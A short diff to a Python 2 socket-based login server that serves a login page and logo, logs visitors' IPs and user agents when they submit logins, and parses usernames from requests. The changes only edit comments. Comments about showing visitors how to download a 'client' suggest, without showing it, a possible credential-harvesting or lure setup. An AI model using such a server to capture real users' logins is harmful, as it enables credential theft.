@@ -48,7 +48,7 @@ def run(handler):
             # Serve login page to new connections, and handle logins
             if 'GET / HTTP/1.1' in request.split('\r\n'):
                 client.send(open('login.html', 'rb').read())
-            # Display information about how to download the 'client'
+            # Display logo
             elif 'GET /assets/img/logo.png HTTP/1.1' in request.split('\r\n'):
                 user_agent = ''
                 for element in request.split('\r\n'):
@@ -57,14 +57,12 @@ def run(handler):
                             user_agent = element.split('User-Agent:')[1].replace('\n', '')
                         except IndexError:
                             pass
-
-                # client.send(
-                #     'HTTP 200 OK\r\n' + open(html_engine.display_information(client_addr[0], user_agent), 'rb').read())
                 client.send(open('assets/img/logo.png', 'rb').read())
                 try:
                     os.remove('info.html')
                 except OSError:
                     pass
+            # Display information about downloading the client
             elif 'GET /favicon.ico HTTP/1.1' in request.split('\r\n'):
                 time.sleep(0.1)
             elif 'POST / HTTP/1.1' in request.split('\r\n'):
@@ -76,7 +74,7 @@ def run(handler):
                             pass
                 open(log_file_name, 'a').write('[*] %s is submitting login information.\nUser Agent: %s\n' %
                                                (client_addr[0], user_agent))
-                print request
+                # print request
             # Login attempts TODO: Encrypt how credentials are sent over the wire
             if len(request.split('username=')) > 1:
                 uname = request.split('username=')[1].split('&')[0]
